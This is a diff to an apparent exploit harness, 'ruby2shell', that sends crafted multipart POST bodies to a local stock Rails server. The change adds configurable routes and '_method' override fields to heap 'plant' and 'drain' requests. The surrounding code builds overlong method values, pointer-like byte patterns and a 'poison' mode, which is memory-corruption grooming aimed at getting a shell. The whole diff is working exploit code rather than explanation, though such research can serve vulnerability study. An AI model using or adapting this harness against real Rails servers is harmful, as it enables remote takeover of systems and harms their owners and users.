@@ -27,6 +27,10 @@ N="${RUBY2SHELL_CLAIM_N:-588}"
 TAGP="${RUBY2SHELL_CLAIM_TAG:-sc588}"
 PLANT_SPEC="${RUBY2SHELL_CLAIM_PLANT:-946x24}"
 DRAIN_SPEC="${RUBY2SHELL_CLAIM_DRAIN:-}"
+PLANT_ROUTE="${RUBY2SHELL_CLAIM_PLANT_ROUTE:-/not-a-route}"
+PLANT_METHOD="${RUBY2SHELL_CLAIM_PLANT_METHOD:-}"
+DRAIN_ROUTE="${RUBY2SHELL_CLAIM_DRAIN_ROUTE:-/not-a-route}"
+DRAIN_METHOD="${RUBY2SHELL_CLAIM_DRAIN_METHOD:-}"
 CLAIM_LIST="${RUBY2SHELL_CLAIM_PARTS:-824,2616,3032,3896}"
 COUNT="${RUBY2SHELL_CLAIM_COUNT:-12}"
 GAP="${RUBY2SHELL_CLAIM_GAP:-0}"
@@ -70,7 +74,7 @@ if [ "${1:-}" = "--one" ]; then
   # from the top; the drain's own chunks stay live (sweep persistence)
   P0=NA
   if [ -n "$DRAIN_SPEC" ] && [ -f "$PFX.drain.body" ]; then
-    P0=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT/not-a-route" \
+    P0=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT$DRAIN_ROUTE" \
       -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
       --data-binary "@$PFX.drain.body" -o "$EV/stock-rails-$TAG.drain.html" \
       -w '%{http_code}' 2>>"$LOG")
@@ -78,7 +82,7 @@ if [ "${1:-}" = "--one" ]; then
   if [ "${RUBY2SHELL_CLAIM_NO_PLANT:-0}" = 1 ]; then
     P1=NA
   else
-    P1=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT/not-a-route" \
+    P1=$(curl -s -m 30 -X POST "http://127.0.0.1:$PORT$PLANT_ROUTE" \
       -H 'Content-Type: multipart/form-data; boundary=XB' -H 'Expect:' \
       --data-binary "@$PFX.plant.body" -o "$EV/stock-rails-$TAG.plant.html" \
       -w '%{http_code}' 2>>"$LOG")
@@ -138,6 +142,7 @@ rm -f "$PFX".*.body "$EV"/stock-rails-"$TAGP"-*.{server.log,html,maps,pid} \
       "$PFX.summary" "$EV"/stock-rails-"$TAGP"-*.excerpt.txt "$PFX".case-arm 2>/dev/null
 
 EV_DIR="$EV" TAG="$TAGP" PLANT_SPEC="$PLANT_SPEC" DRAIN_SPEC="$DRAIN_SPEC" \
+PLANT_METHOD="$PLANT_METHOD" DRAIN_METHOD="$DRAIN_METHOD" \
 CLAIM_LIST="$CLAIM_LIST" \
 CLAIM_MODE="${RUBY2SHELL_CLAIM_MODE:-strip}" \
 python3 - "$N" <<'PY'
@@ -149,6 +154,7 @@ def part(name, content, ctype):
     return (b'--XB\r\nContent-Disposition: form-data; name="' + name +
             b'"\r\nContent-Type: ' + ctype + b'\r\n\r\n' + content)
 AB = b'text/plain; charset=ASCII-8BIT'
+ISO = b'text/plain; charset=ISO-8859-1'
 pattern = (0x250).to_bytes(8, 'little') + (0x90).to_bytes(8, 'little')
 method = b'a' + b'\xdf' * (n - 5) + b'\x00\x00\x51\x02'
 if mode == 'poison':
@@ -233,6 +239,8 @@ for grp in os.environ['PLANT_SPEC'].split(','):
     size, count = (int(v, 0) for v in grp.split('x'))
     for _ in range(count):
         pp.append(part(f'p{len(pp)}'.encode(), plant_content(size), AB))
+if os.environ.get('PLANT_METHOD'):
+    pp.append(part(b'_method', os.environ['PLANT_METHOD'].encode(), ISO))
 open(f'{ev}/stock-rails-{tag}.plant.body', 'wb').write(
     b'\r\n'.join(pp) + b'\r\n--XB--\r\n')
 dp = []
@@ -244,6 +252,8 @@ for grp in os.environ.get('DRAIN_SPEC', '').split(','):
         # plain content: drains recycled holes, forges irrelevant
         dp.append(part(f'd{len(dp)}'.encode(), b'd' * size, AB))
 if dp:
+    if os.environ.get('DRAIN_METHOD'):
+        dp.append(part(b'_method', os.environ['DRAIN_METHOD'].encode(), ISO))
     open(f'{ev}/stock-rails-{tag}.drain.body', 'wb').write(
         b'\r\n'.join(dp) + b'\r\n--XB--\r\n')
 cp = []
